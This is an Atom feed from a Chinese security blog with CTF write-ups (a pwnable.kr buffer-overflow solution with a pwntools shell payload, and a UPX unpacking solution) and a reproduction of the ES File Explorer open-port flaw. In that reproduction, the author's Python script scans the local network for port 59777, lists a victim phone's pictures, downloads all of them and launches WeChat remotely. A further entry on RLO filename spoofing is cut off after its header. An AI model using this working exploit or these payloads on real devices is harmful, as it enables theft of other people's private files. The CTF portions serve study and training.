<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://threst.github.io/"/>
  <updated>2019-01-24T04:17:24.910Z</updated>
  <id>https://threst.github.io/</id>
  
  <author>
    <name>threst</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>pwnable_bof</title>
    <link href="https://threst.github.io/2019/01/23/pwnable_bof/"/>
    <id>https://threst.github.io/2019/01/23/pwnable_bof/</id>
    <published>2019-01-23T05:32:13.000Z</published>
    <updated>2019-01-24T04:17:24.910Z</updated>
    
    <content type="html"><![CDATA[<p><code>nc pwnable.kr 9000</code></p><p>源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> `[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">    gets(overflowme);   <span class="comment">// smash me!</span></span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.<code>overflowme</code>是一个长度为32的数组</p><p>2.<code>gets</code>没有做输入的限制</p><p>3.当<code>key == 0xcafebabe</code>才可以调用命令</p><p>所以，这是个栈溢出的pwn,首先输入超出栈，溢出将<code>key</code>的值改变</p><p>盗用别人的IDAf5查看</p><p><img src="https://www.superbed.cn/pic/5c457f995f3e509ed94c6a17" alt=""></p><p><code>s</code>的地址为<code>bp-2c</code>,<code>a1</code>的地址为<code>bp+8</code>,那么相差就是<code>0x2c+0x08=52</code></p><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"pwnable.kr"</span>,<span class="string">"9000"</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="number">0xcafebabe</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">52</span> + p32(key)</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><strong>flag</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">python wp.py</span><br><span class="line">[+] Opening connection to pwnable.kr on port 9000: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">$ ls </span><br><span class="line">bof</span><br><span class="line">bof.c</span><br><span class="line">flag</span><br><span class="line"><span class="built_in">log</span></span><br><span class="line">log2</span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;code&gt;nc pwnable.kr 9000&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;源码&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://threst.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ES文件浏览器漏洞复现</title>
    <link href="https://threst.github.io/2019/01/23/Esfile/"/>
    <id>https://threst.github.io/2019/01/23/Esfile/</id>
    <published>2019-01-23T05:32:13.000Z</published>
    <updated>2019-01-24T03:54:22.329Z</updated>
    
    <content type="html"><![CDATA[<h2 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h2><p>文章首发<a href="https://xz.aliyun.com/t/3934" target="_blank" rel="noopener">先知社区</a>，未经允许，禁止转载</p><p>今天上网的时候看到一个<a href="https://twitter.com/fs0c131y/status/1085461301588094976" target="_blank" rel="noopener">新闻</a>,ES文件浏览器存在漏洞，同一个网络下的用户可以直接访问安装了ＥＳ的用户手机上的文件，正好我手机上也安装了es，于是就测试了下。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p><strong>poc<a href="https://github.com/fs0c131y/ESFileExplorerOpenPortVuln" target="_blank" rel="noopener">地址</a></strong>下载</p><p><strong>ip</strong>:</p><p>开始是192.168.0.100</p><p>后来有事去了，再连就是192.168.0.102</p><p><strong>版本号</strong>:4.1.9.4</p><h1 id="0x00验证漏洞"><a href="#0x00验证漏洞" class="headerlink" title="0x00验证漏洞"></a>0x00验证漏洞</h1><p>首先电脑和手机处于同一个网络，再查看我的手机ip,和es的版本</p><p><img src="https://www.superbed.cn/pic/5c43dafa5f3e509ed9435a81" alt=""></p><p><img src="https://www.superbed.cn/pic/5c43dafa5f3e509ed9435a83" alt=""></p><p>执行命令<code>python poc.py poc.py --cmd getDeviceInfo --network  192.168.0.</code></p><p><img src="https://www.superbed.cn/pic/5c4682be5f3e509ed9518d11" alt=""></p><h1 id="0x01分析原理"><a href="#0x01分析原理" class="headerlink" title="0x01分析原理"></a>0x01分析原理</h1><p>看了各位大佬的分析，小白我大概知道了原理，就是向手机发送一个json的数据包,我们使用大佬的<a href="https://github.com/fs0c131y/ESFileExplorerOpenPortVuln" target="_blank" rel="noopener">脚本</a>,想手机发送一个数据包，抓包分析一下</p><p><img src="https://www.superbed.cn/pic/5c4689a55f3e509ed951bee4" alt=""></p><p>确实是发送了一个json的数据包</p><h1 id="0x02获取受害者手机图片"><a href="#0x02获取受害者手机图片" class="headerlink" title="0x02获取受害者手机图片"></a>0x02获取受害者手机图片</h1><p>首先列出受害者手机所有图片</p><p><code>python poc.py --cmd listPics</code></p><p><img src="https://www.superbed.cn/pic/5c43de555f3e509ed9436bb7" alt=""></p><p>可以看到很多手机图片</p><h1 id="0x03下载受害者图片"><a href="#0x03下载受害者图片" class="headerlink" title="0x03下载受害者图片"></a>0x03下载受害者图片</h1><p>我们随便从刚才获得的列表中挑一张下载试试</p><p><code>python poc.py -g /storage/emulated/0/DCIM/Camera/IMG_20181218_175120.jpg</code></p><p><img src="https://www.superbed.cn/pic/5c43e1575f3e509ed9437a06" alt=""></p><p>成功将图片下载到本地</p><h1 id="0x04造个轮子"><a href="#0x04造个轮子" class="headerlink" title="0x04造个轮子"></a>0x04造个轮子</h1><p>玩了下大佬的脚本，确实厉害，但是发现一个问题，就是他的脚本会自动扫描局域网所有的ip，这样就会很浪费时间,所以本着练习python编程的想法，自己又造了个轮子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">addrs = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> range(<span class="number">101</span>, <span class="number">104</span>):</span><br><span class="line">        addr = <span class="string">"192.168.0."</span>+str(ip)</span><br><span class="line">        s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">        s.settimeout(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s.connect_ex((addr, <span class="number">59777</span>)):</span><br><span class="line">            s.close()</span><br><span class="line">            print(<span class="string">"[+]"</span>+addr+<span class="string">"存在漏洞"</span>)</span><br><span class="line">            addrs.append(addr)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            s.close()</span><br><span class="line">    print(<span class="string">"[+]扫描结束\n[+]执行操作"</span>+sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    poc()</span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> addrs:</span><br><span class="line">        headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line">        address = <span class="string">'http://'</span> + addr + <span class="string">':59777'</span></span><br><span class="line">        data = <span class="string">'&#123; "command":'</span> + cmd + <span class="string">' &#125;'</span></span><br><span class="line">        r = requests.post(address, headers=headers, data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">'listPics'</span>:<span class="comment">#下载图片</span></span><br><span class="line">            image = re.compile(<span class="string">r'/s.*jpg'</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span>  image.findall(r.text):</span><br><span class="line">                imageurl =  address  + i            </span><br><span class="line">                filename = i.rsplit(<span class="string">'/'</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">                r = requests.get(imageurl, headers=headers)</span><br><span class="line">                print(<span class="string">"[+]正在下载"</span>+i)</span><br><span class="line">                <span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(r.content)</span><br><span class="line">                    <span class="comment">#break</span></span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">'wx'</span>:<span class="comment">#启动微信</span></span><br><span class="line">            data = <span class="string">'&#123;"command":"appLaunch", "appPackageName": "com.tencent.mm"&#125;'</span></span><br><span class="line">            r = requests.post(address, headers=headers, data=data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            print(r.text)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        cmd(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'Usage:'</span>)</span><br><span class="line">        print(<span class="string">'python3 es.py wx'</span>)</span><br><span class="line">        print(<span class="string">'python3 es.py listPics'</span>)</span><br><span class="line">        print(<span class="string">'python3 es.py listApps'</span>)</span><br><span class="line">        print(<span class="string">'python3 es.py listAudios'</span>)</span><br><span class="line">        print(<span class="string">'python3 es.py listVideos'</span>)</span><br><span class="line">        print(<span class="string">'python3 es.py listAppsPhone'</span>)</span><br><span class="line">        print(<span class="string">'python3 es.py getDeviceInfo'</span>)</span><br><span class="line">        print(<span class="string">'python3 es.py listAppsAll'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>添加了一键下载所有图片，启动微信等功能,大致原理就是去请求资源的地址，只要符合APP的方法就行,具体方法参考漏洞路径<code>4.1.84class2.-dex2jar.jar\com\estrongs\android\f\a.class</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> c.<span class="function">b <span class="title">a</span><span class="params">(String paramString1, String paramString2, Properties paramProperties1, Properties paramProperties2, Properties paramProperties3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (paramString1.startsWith(<span class="string">"/estrongs_filemgr_oauth_result"</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    paramString1 = CreateOAuthNetDisk.b();</span><br><span class="line">    <span class="keyword">if</span> (paramString1 != <span class="keyword">null</span>) &#123;</span><br><span class="line">      paramString1.a(paramProperties2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (paramString2.equals(<span class="string">"POST"</span>))<span class="comment">//判断发送方法是否为POST</span></span><br><span class="line">  &#123;</span><br><span class="line">    localObject = <span class="keyword">new</span> String(g());</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      localObject = <span class="keyword">new</span> JSONObject((String)localObject);<span class="comment">//JSONG解码</span></span><br><span class="line">      String str = ((JSONObject)localObject).getString(<span class="string">"command"</span>);<span class="comment">//获取JSON中command字段值</span></span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listFiles"</span>)) &#123;<span class="comment">//获取文件列表</span></span><br><span class="line">        <span class="keyword">return</span> b(paramString1);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listPics"</span>)) &#123;<span class="comment">//获取图片列表</span></span><br><span class="line">        <span class="keyword">return</span> d();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listVideos"</span>)) &#123;<span class="comment">//获取视频列表</span></span><br><span class="line">        <span class="keyword">return</span> e();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listAudios"</span>)) &#123;<span class="comment">//获取音频列表</span></span><br><span class="line">        <span class="keyword">return</span> f();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listApps"</span>)) &#123;<span class="comment">//获取软件列表</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listAppsSystem"</span>)) &#123;<span class="comment">//获取系统软件列表</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listAppsPhone"</span>)) &#123;<span class="comment">//获取电话软件列表</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listAppsSdcard"</span>)) &#123;<span class="comment">//获取安装在SD卡中的软件列表</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">3</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listAppsAll"</span>)) &#123;<span class="comment">//获取全部APP</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"getAppThumbnail"</span>)) &#123;<span class="comment">//获取APP缩略图</span></span><br><span class="line">        <span class="keyword">return</span> d((JSONObject)localObject);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"appLaunch"</span>)) &#123;<span class="comment">//启动APP</span></span><br><span class="line">        <span class="keyword">return</span> a((JSONObject)localObject);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"appPull"</span>)) &#123;<span class="comment">//下载APP</span></span><br><span class="line">        <span class="keyword">return</span> c((JSONObject)localObject);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"getDeviceInfo"</span>))<span class="comment">//获取设备信息</span></span><br><span class="line">      &#123;</span><br><span class="line">        paramString1 = b((JSONObject)localObject);</span><br><span class="line">        <span class="keyword">return</span> paramString1;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (JSONException paramString1)</span><br><span class="line">    &#123;</span><br><span class="line">      paramString1.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> c.b(<span class="keyword">this</span>, <span class="string">"500 Internal Server Error"</span>, <span class="string">"text/plain"</span>, paramString1.toString());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  Object localObject = ah.bL(paramString1);</span><br><span class="line">  <span class="keyword">if</span> ((localObject == <span class="keyword">null</span>) || (ah.I((String)localObject) == <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (localObject == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">super</span>.a(paramString1, paramString2, paramProperties1, paramProperties2, paramProperties3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.a((String)localObject, paramString2, paramProperties1, paramProperties2, paramProperties3);</span><br><span class="line">  &#125;</span><br><span class="line">  paramString1 = paramProperties1.getProperty(<span class="string">"range"</span>);</span><br><span class="line">  <span class="keyword">if</span> ((paramString1 != <span class="keyword">null</span>) &amp;&amp; (paramString1.startsWith(<span class="string">"bytes="</span>)))</span><br><span class="line">  &#123;</span><br><span class="line">    paramString2 = paramString1.substring(<span class="string">"bytes="</span>.length());</span><br><span class="line">    <span class="keyword">int</span> i = paramString2.indexOf(<span class="string">'-'</span>);</span><br><span class="line">    paramString1 = paramString2;</span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      paramString1 = paramString2.substring(<span class="number">0</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      l = Long.parseLong(paramString1);</span><br><span class="line">      <span class="keyword">return</span> a((String)localObject, l, <span class="number">0L</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (NumberFormatException paramString1)</span><br><span class="line">    &#123;</span><br><span class="line">      l = <span class="number">0L</span>;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">long</span> l = <span class="number">0L</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x05其他功能"><a href="#0x05其他功能" class="headerlink" title="0x05其他功能"></a>0x05其他功能</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">listFiles：列出所有文件</span><br><span class="line">listPics：列出所有图片</span><br><span class="line">listVideos：列出所有视频</span><br><span class="line">listAudios：列出所有音频文件</span><br><span class="line">listApps：列出所有已安装的应用</span><br><span class="line">listAppsSystem：列出所有系统应用</span><br><span class="line">listAppsPhone：列出所有手机应用</span><br><span class="line">listAppsSdcard：列出所有sdcard </span><br><span class="line">listAppsAll：列出安装的所有应用程序（包括系统应用程序）</span><br><span class="line">getDeviceInfo：获取设备信息</span><br><span class="line">appPull：从设备中提取应用程序。需要包名称参数</span><br><span class="line">appLaunch：启动应用程序。需要包名称参数</span><br><span class="line">getAppThumbnail：获取应用程序的图标。包名称参数是必需的</span><br></pre></td></tr></table></figure><p>其他功能感兴趣的可以自己测试，最后还要膜下发现漏洞的大佬，是真的强。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;写在前面的话&quot;&gt;&lt;a href=&quot;#写在前面的话&quot; class=&quot;headerlink&quot; title=&quot;写在前面的话&quot;&gt;&lt;/a&gt;写在前面的话&lt;/h2&gt;&lt;p&gt;文章首发&lt;a href=&quot;https://xz.aliyun.com/t/3934&quot; target=&quot;_bl
      
    
    </summary>
    
    
      <category term="apt" scheme="https://threst.github.io/tags/apt/"/>
    
  </entry>
  
  <entry>
    <title>pwnable_fd</title>
    <link href="https://threst.github.io/2019/01/22/pwnable_flag/"/>
    <id>https://threst.github.io/2019/01/22/pwnable_flag/</id>
    <published>2019-01-22T05:32:13.000Z</published>
    <updated>2019-01-24T04:18:47.090Z</updated>
    
    <content type="html"><![CDATA[<p>开始不知道，ida打开只有三个函数，原来是加了UPX壳</p><p><code>upx -d flag</code>脱壳大法</p><p><strong>解法1</strong></p><p><img src="https://www.superbed.cn/pic/5c45c6515f3e509ed94df631" alt=""></p><p>一堆<code>mov</code>,看一下<code>cs:flag</code>,提示好像发现了什么,点去进去看看</p><p><img src="https://www.superbed.cn/pic/5c45c6bf5f3e509ed94df881" alt=""></p><p>flag就是<code>UPX...? sounds like a delivery service :)</code></p><p><strong>解法2</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">└──╼ <span class="variable">$gdb</span> -q flag</span><br><span class="line">pwndbg: loaded 177 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from flag...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">pwndbg&gt; disass main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x0000000000401164 &lt;+0&gt;:push   rbp</span><br><span class="line">   0x0000000000401165 &lt;+1&gt;:mov    rbp,rsp</span><br><span class="line">   0x0000000000401168 &lt;+4&gt;:sub    rsp,0x10</span><br><span class="line">   0x000000000040116c &lt;+8&gt;:mov    edi,0x496658</span><br><span class="line">   0x0000000000401171 &lt;+13&gt;:call   0x402080 &lt;puts&gt;</span><br><span class="line">   0x0000000000401176 &lt;+18&gt;:mov    edi,0x64</span><br><span class="line">   0x000000000040117b &lt;+23&gt;:call   0x4099d0 &lt;malloc&gt;</span><br><span class="line">   0x0000000000401180 &lt;+28&gt;:mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x0000000000401184 &lt;+32&gt;:mov    rdx,QWORD PTR [rip+0x2c0ee5]        <span class="comment"># 0x6c2070 &lt;flag&gt;</span></span><br><span class="line">   0x000000000040118b &lt;+39&gt;:mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x000000000040118f &lt;+43&gt;:mov    rsi,rdx</span><br><span class="line">   0x0000000000401192 &lt;+46&gt;:mov    rdi,rax</span><br><span class="line">   0x0000000000401195 &lt;+49&gt;:call   0x400320</span><br><span class="line">   0x000000000040119a &lt;+54&gt;:mov    eax,0x0</span><br><span class="line">   0x000000000040119f &lt;+59&gt;:leave  </span><br><span class="line">   0x00000000004011a0 &lt;+60&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; x/s * 0x6c2070</span><br><span class="line">0x496628:<span class="string">"UPX...? sounds "</span>...</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;开始不知道，ida打开只有三个函数，原来是加了UPX壳&lt;/p&gt;
&lt;p&gt;&lt;code&gt;upx -d flag&lt;/code&gt;脱壳大法&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解法1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.superbed.cn/pic/
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://threst.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>RLO文件名欺骗</title>
    <link href="https://threst.github.io/2019/01/22/RLO%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97/"/>
    <id>https://threst.github.io/2019/01/22/RLO文件名欺骗/</id>
    <published>2019-01-22T05:32:13.000Z</published>
    <updated>2019-01-24T03:50:49.088Z</updated>
    
